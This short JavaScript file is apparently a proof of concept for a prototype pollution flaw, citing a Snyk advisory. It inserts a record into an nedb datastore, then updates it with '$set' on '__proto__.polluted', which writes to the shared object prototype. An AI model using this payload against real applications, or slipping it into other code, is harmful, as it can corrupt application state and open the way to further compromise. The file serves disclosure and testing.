//https://security.snyk.io/vuln/SNYK-JS-TSNODASH-1311009
 
  const Datastore = require("nedb");
  const db = new Datastore();

   

  db.insert({ hello: "world" }, (err) => {
    db.update(
      { hello: "world" },
      { $set: { "__proto__.polluted": "yes" } },
      {},
      (err) => {
         
      }
    );
  });
// End of file
